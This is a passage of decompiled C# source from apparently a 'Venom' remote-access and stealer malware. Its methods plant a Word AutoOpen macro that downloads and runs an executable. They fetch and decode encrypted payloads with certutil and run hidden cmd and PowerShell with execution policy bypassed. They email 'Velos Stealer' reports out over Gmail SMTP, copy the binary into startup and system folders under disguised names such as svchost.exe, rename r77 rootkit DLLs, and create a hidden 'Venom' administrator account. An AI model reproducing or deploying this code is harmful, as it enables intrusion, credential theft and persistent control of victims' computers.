			gZipStream.Read(array2, 0, array2.Length);
		}
		return Encoding.UTF8.GetString(array2);
	}

	public static void smethod_107(string url, string name)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string path = Path.Combine(Path.Combine(folderPath, "Microsoft"), "Templates");
		Path.Combine(path, "Normal.dotm");
		string text = Path.Combine(path, "microsoftvba.vba");
		string text2 = Path.Combine(folderPath, name + ".exe");
		if (File.Exists(text))
		{
			File.Delete(text);
			File.Create(text);
		}
		File.AppendAllText("Private Sub EKTELESHTHESILHPSHS()\r\n    Dim LHPSH As String\r\n    Dim THESILHPSHS As String\r\n    Dim WinHttpReq As Object, oStream As Object\r\n    Dim result As Integer\r\n    \r\nLHPSH = \"" + url + "\"" + Environment.NewLine + "THESILHPSHS =\"" + text2 + "\"" + Environment.NewLine + Environment.NewLine + "Set WinHttpReq = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\r\n    WinHttpReq.setOption(2) = 13056 ' Ignore cert errors\r\n    WinHttpReq.Open \"GET\", LHPSH, False ', \"username\", \"password\"\r\n    WinHttpReq.setRequestHeader \"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\"\r\n    WinHttpReq.Send\r\n    \r\n    If WinHttpReq.Status = 200 Then\r\n        Set oStream = CreateObject(\"ADODB.Stream\")\r\n        oStream.Open\r\n        oStream.Type = 1\r\n        oStream.Write WinHttpReq.ResponseBody\r\n        oStream.SaveToFile THESILHPSHS, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)\r\n        oStream.Close\r\n        Shell (THESILHPSHS)\r\n    End If    \r\n    \r\nEnd Sub\r\n\r\n\r\nSub AutoOpen()\r\n    EKTELESHTHESILHPSHS\r\nEnd Sub\r\n", text);
		string.Format(text);
	}

	public static void smethod_108()
	{
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		string path = Path.Combine(GClass5.string_4, GClass5.string_5);
		string text = Path.Combine(path, "Venom");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		else
		{
			Directory.Delete(text);
			Directory.CreateDirectory(text);
		}
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEI3BmJ8BBbtmZueXrOQ6tSTbDyOu7NT9gHU66c4GP8NwYLEvzQuVIr1Izn6wHGZ4Ro="))))).ReadToEnd();
		string text2 = Path.Combine(text, "confuse.exe");
		byte[] bytes = Convert.FromBase64String(smethod_58(encrypted));
		File.WriteAllBytes(text2, bytes);
		string destFileName = Path.Combine(path, "Venom.exe");
		try
		{
			string text3 = Path.Combine(text, "edit");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text3);
			}
			string[] files = Directory.GetFiles(text, "*.exe");
			foreach (string text4 in files)
			{
				if (!File.Exists(text4))
				{
					File.Move(text4, text3);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
		string text5 = Path.Combine(Path.Combine(text, "edit"), "*.exe");
		foreach (char c in text5)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b " + text2 + "  " + c,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		try
		{
			string[] files = Directory.GetFiles(Path.Combine(text, "edit"), "*.vmp.exe");
			foreach (string text6 in files)
			{
				if (!File.Exists(text6))
				{
					File.Move(text6, text);
				}
			}
		}
		catch (Exception ex2)
		{
			MessageBox.Show(ex2.ToString());
		}
		Directory.GetFiles(text, "*.vmp.exe");
		text5 = text;
		for (int i = 0; i < text5.Length; i++)
		{
			_ = text5[i];
		}
		string text7 = Path.Combine(path, "Venom.vmp.exe");
		File.Move(text7, destFileName);
		File.Delete(text7);
	}

	public static void smethod_109(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}

	public static void smethod_110()
	{
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "C:\\windows\\system32\\schtasks.exe";
		process.StartInfo.Arguments = "/Run /TN \"OneDrive\" ";
		process.Start();
	}

	public static void smethod_111(string filepath, string email, string toemail, string password, string token)
	{
		smethod_102();
		smethod_103(token);
		try
		{
			StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "send.ps1"));
			Path.Combine(Path.GetTempPath(), "blat.exe");
			streamWriter.WriteLine("$SMTPServer = 'smtp.gmail.com';");
			streamWriter.WriteLine("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);");
			streamWriter.WriteLine("$SMTPInfo.EnableSsl = $true;");
			streamWriter.WriteLine("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + email + "', '" + password + "');");
			streamWriter.WriteLine("$ReportEmail = New-Object System.Net.Mail.MailMessage;");
			streamWriter.WriteLine("$ReportEmail.From = '" + email + "';");
			streamWriter.WriteLine("$ReportEmail.To.Add('" + toemail + "');");
			streamWriter.WriteLine("$ReportEmail.Subject = 'Velos Stealer Report';");
			streamWriter.WriteLine("$ReportEmail.Body = 'Velos Stealer report in the attachments.';");
			streamWriter.WriteLine("$ReportEmail.Attachments.Add('" + filepath + "');");
			streamWriter.WriteLine("$SMTPInfo.Send($ReportEmail);");
			streamWriter.Close();
			Thread.Sleep(5000);
			string text = Path.Combine(Path.GetTempPath(), "send.ps1");
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell -ExecutionPolicy Bypass " + text + "; & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			})!.WaitForExit();
			Thread.Sleep(40000);
			Task.Run(async () => DelRdpMethodAsync()).Wait();
			Class2.smethod_15();
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_112(string dir)
	{
		string path = Environment.GetEnvironmentVariable("temp") + "\\" + smethod_113();
		if (Directory.Exists(path))
		{
			Directory.Delete(path);
		}
	}

	public static string smethod_113()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		string result = "";
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
			ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + text + ":\"");
			val.Get();
			result = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public static void smethod_114()
	{
		if (File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
		{
			try
			{
				File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
			}
			catch (IOException ex)
			{
				Console.WriteLine(ex.Message);
				return;
			}
		}
		FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
		try
		{
			fileInfo.Delete();
		}
		catch (IOException ex2)
		{
			Console.WriteLine(ex2.Message);
		}
		try
		{
			Directory.Delete("C:\\Program Files\\RDP Wrapper");
		}
		catch (IOException ex3)
		{
			Console.WriteLine(ex3.Message);
		}
		if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
		{
			try
			{
				Directory.Delete("C:\\Program Files\\RDP Wrapper", recursive: true);
			}
			catch (IOException ex4)
			{
				Console.WriteLine(ex4.Message);
			}
		}
		DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
		try
		{
			directoryInfo.Delete(recursive: true);
		}
		catch (IOException ex5)
		{
			Console.WriteLine(ex5.Message);
		}
		FileSecurity accessControl = File.GetAccessControl("C:\\Program Files\\RDP Wrapper");
		SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
		accessControl.SetOwner(user);
		accessControl.SetAccessRule(new FileSystemAccessRule(user, FileSystemRights.FullControl, AccessControlType.Allow));
		File.SetAccessControl("C:\\Program Files\\RDP Wrapper", accessControl);
		File.Delete("C:\\Program Files\\RDP Wrapper");
	}

	public static void smethod_115(string link, string decodedfile)
	{
		string path = Path.Combine(GClass5.string_4, GClass5.string_5);
		string text = Path.Combine(path, "encrypt.txt");
		string text2 = Path.Combine(path, decodedfile);
		new WebClient().DownloadFile(link, text);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/k start /b certutil -decode " + text + "  " + text2 + "  & exit";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.UseShellExecute = true;
		processStartInfo.ErrorDialog = false;
		Process.Start(processStartInfo)!.WaitForExit();
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b " + text2 + "  & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		File.SetAttributes(text2, FileAttributes.Hidden);
	}

	public static void smethod_116(string link, string encrypted, string decodedfile)
	{
		string path = Path.Combine(GClass5.string_4, GClass5.string_5);
		string text = Path.Combine(path, encrypted);
		string text2 = Path.Combine(path, decodedfile);
		new WebClient().DownloadFile(link, text);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/k start /b certutil -decode " + text + "  " + text2 + "  & exit";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.UseShellExecute = true;
		processStartInfo.ErrorDialog = false;
		Process.Start(processStartInfo)!.WaitForExit();
		File.SetAttributes(text2, FileAttributes.Hidden);
	}

	public static void smethod_117(string link, string encrypted, string decodedfile)
	{
		string path = Path.Combine(GClass5.string_4, GClass5.string_5);
		string text = Path.Combine(path, encrypted);
		string text2 = Path.Combine(path, decodedfile);
		new WebClient().DownloadFile(link, text);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/k start /b certutil -decode " + text + "  " + text2 + "  & exit";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.UseShellExecute = true;
		processStartInfo.ErrorDialog = false;
		Process.Start(processStartInfo)!.WaitForExit();
		File.SetAttributes(text2, FileAttributes.Hidden);
	}

	public static void smethod_118(string link, string name)
	{
		string text = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), name);
		new WebClient().DownloadFile(link, text);
		File.SetAttributes(text, FileAttributes.Hidden);
	}

	public static void smethod_119(string link, string name)
	{
		string text = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), name);
		new WebClient().DownloadFile(link, text);
		File.SetAttributes(text, FileAttributes.Hidden);
	}

	public static void smethod_120()
	{
		string[] files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "*.txt");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
	}

	public static void smethod_121()
	{
		try
		{
			bool[] array = new bool[2] { true, false };
			foreach (bool flag in array)
			{
				using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", writable: true);
				if ((registryKey.GetValue("AppInit_DLLs", "") as string).Contains("Venom"))
				{
					registryKey.SetValue("AppInit_DLLs", "");
				}
			}
		}
		catch
		{
		}
	}

	public static void smethod_122()
	{
		try
		{
			SetThreadExecutionState((GEnum19)2147483651u);
		}
		catch
		{
		}
	}

	public static void smethod_123()
	{
		using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\");
		if (registryKey != null && registryKey.GetValue("Release") != null)
		{
			Console.WriteLine(".NET Framework Version: " + smethod_135((int)registryKey.GetValue("Release")));
			return;
		}
		Console.WriteLine(".NET Framework Version 4.5 or later is not detected.");
		Console.WriteLine("Installing Net 4 for you.");
		string address = Strings.StrReverse("exe.46x_68x_lluF_04xFteNtod/EAAD8C69AE6D-63CB-6FA4-73A7-B6169A59/A/5/9/daolnwod/moc.tfosorcim.daolnwod//:ptth");
		string text = Path.Combine(Path.GetTempPath(), "net.exe");
		new WebClient().DownloadFile(address, text);
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b  " + text + " /q & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		})!.WaitForExit();
	}

	public static void smethod_124()
	{
		string text = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Chrome_Update.exe");
		Process.Start(text).WaitForExit();
		File.SetAttributes(text, FileAttributes.Hidden);
		Thread.Sleep(5000);
		smethod_128();
		Thread.Sleep(5000);
		smethod_125();
		smethod_67();
	}

	public static void smethod_125()
	{
		Thread.Sleep(30000);
		string[] files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "adduser.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "allow.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "addexclusion.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "*.dll");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Install.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Nvidia-Update.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Nvidia_Update.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Nvidia_Share.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "svchost.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Chrome.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Chrome_Update.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Install_Update.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "uac.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "uac2.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
	}

	public static void smethod_126()
	{
		string[] files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "Install_Update.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
		files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "uac.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
	}

	public static void smethod_127()
	{
		Process.Start(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)), "svchost.exe"));
		string[] files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "svchost.exe");
		for (int i = 0; i < files.Length; i++)
		{
			File.Delete(files[i]);
		}
	}

	public static void smethod_128()
	{
		string path = Path.Combine(GClass5.string_4, GClass5.string_5);
		if (File.Exists(Path.Combine(path, "Install.exe")))
		{
			string text = Path.Combine(GClass5.string_4, GClass5.string_5);
			string[] files = Directory.GetFiles(text, "Install.exe");
			string destFileName = Path.Combine(text, "VenomInstall.exe");
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				File.Move(array[i], destFileName);
			}
		}
		if (File.Exists(Path.Combine(path, "r77-x64.dll")))
		{
			string text2 = Path.Combine(GClass5.string_4, GClass5.string_5);
			string[] files2 = Directory.GetFiles(text2, "r77-x64.dll");
			string destFileName2 = Path.Combine(text2, "Venomx64.dll");
			string[] array = files2;
			for (int i = 0; i < array.Length; i++)
			{
				File.Move(array[i], destFileName2);
			}
		}
		if (File.Exists(Path.Combine(path, "r77-x86.dll")))
		{
			string text3 = Path.Combine(GClass5.string_4, GClass5.string_5);
			string[] files3 = Directory.GetFiles(text3, "r77-x86.dll");
			string destFileName3 = Path.Combine(text3, "Venomx86.dll");
			string[] array = files3;
			for (int i = 0; i < array.Length; i++)
			{
				File.Move(array[i], destFileName3);
			}
		}
		if (File.Exists(Path.Combine(path, "Nvidia-Update.exe")))
		{
			string text4 = Path.Combine(GClass5.string_4, GClass5.string_5);
			string[] files4 = Directory.GetFiles(text4, "Nvidia-Update.exe");
			string destFileName4 = Path.Combine(text4, "VenomNvidia-Update.exe");
			string[] array = files4;
			for (int i = 0; i < array.Length; i++)
			{
				File.Move(array[i], destFileName4);
			}
		}
	}

	public static void smethod_129()
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "Your Phone.exe");
		File.Copy(GClass69.InstallPath, text);
		Process.Start(new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = text
		});
		string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Your Phone.exe");
		File.Copy(GClass69.InstallPath, text2);
		Process.Start(new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = text2
		});
		string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "VenomYour Phone.exe");
		File.Copy(GClass69.InstallPath, text3);
		Process.Start(new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = text3
		});
		string text4 = "C:\\users\\public\\Venomsys.exe";
		File.Copy(GClass69.InstallPath, text4);
		Process.Start(new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = text4
		});
		string text5 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "Venomsvchost.exe");
		File.Copy(GClass69.InstallPath, text5);
		Process.Start(new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = text5
		});
		string text6 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Venomsvchost.exe");
		File.Copy(GClass69.InstallPath, text6);
		Process.Start(new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = text6
		});
	}

	public static void smethod_130()
	{
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_0178: Expected O, but got Unknown
		//IL_0410: Unknown result type (might be due to invalid IL or missing references)
		//IL_0417: Expected O, but got Unknown
		//IL_0495: Unknown result type (might be due to invalid IL or missing references)
		//IL_049c: Expected O, but got Unknown
		//IL_06fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0701: Expected O, but got Unknown
		//IL_077f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0786: Expected O, but got Unknown
		switch (Environment.OSVersion.Version.Major)
		{
		case 6:
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey2 == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey2.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey2.SetValue("dontdisplaylastusername", 1);
			}
			registryKey2.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey2.SetValue("DWORD", 2);
			}
			registryKey2.Flush();
			string text2 = "Venom";
			string password2 = "Venom";
			PrincipalContext val4 = null;
			try
			{
				Console.WriteLine("Building System Information");
				val4 = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex4)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex4);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val4, text2) != null)
			{
				Console.WriteLine(text2 + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val5 = new UserPrincipal(val4);
			((Principal)val5).set_Name(text2);
			((Principal)val5).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val5).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val5).SetPassword(password2);
			((AuthenticablePrincipal)val5).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val5).Save();
			}
			catch (Exception ex5)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex5);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val6 = null;
			try
			{
				val6 = GroupPrincipal.FindByIdentity(val4, "Administrators");
				if (val6 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val6.get_Members().Contains(val4, (IdentityType)0, text2))
					{
						Console.WriteLine("Administrators already contains " + text2);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val6.get_Members().Add(val5);
					((Principal)val6).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex6)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex6);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val6).Dispose();
			((Principal)val5).Dispose();
			val4.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		case 10:
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey3 == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey3.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey3.SetValue("dontdisplaylastusername", 1);
			}
			registryKey3.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey3.SetValue("DWORD", 2);
			}
			registryKey3.Flush();
			string text3 = "Venom";
			string password3 = "Venom";
			PrincipalContext val7 = null;
			try
			{
				Console.WriteLine("Building System Information");
				val7 = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex7)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex7);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val7, text3) != null)
			{
				Console.WriteLine(text3 + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val8 = new UserPrincipal(val7);
			((Principal)val8).set_Name(text3);
			((Principal)val8).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val8).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val8).SetPassword(password3);
			((AuthenticablePrincipal)val8).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val8).Save();
			}
			catch (Exception ex8)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex8);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val9 = null;
			try
			{
				val9 = GroupPrincipal.FindByIdentity(val7, "Administrators");
				if (val9 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val9.get_Members().Contains(val7, (IdentityType)0, text3))
					{
						Console.WriteLine("Administrators already contains " + text3);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val9.get_Members().Add(val8);
					((Principal)val9).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex9)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex9);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val9).Dispose();
			((Principal)val8).Dispose();
			val7.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		case 5:
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey.SetValue("dontdisplaylastusername", 1);
			}
			registryKey.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey.SetValue("DWORD", 2);
			}
			registryKey.Flush();
			string text = "Venom";
			string password = "Venom";
			PrincipalContext val = null;
			try
			{
				Console.WriteLine("Building System Information");
				val = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val, text) != null)
			{
				Console.WriteLine(text + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val2 = new UserPrincipal(val);
			((Principal)val2).set_Name(text);
			((Principal)val2).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val2).set_PasswordNeverExpires(true);
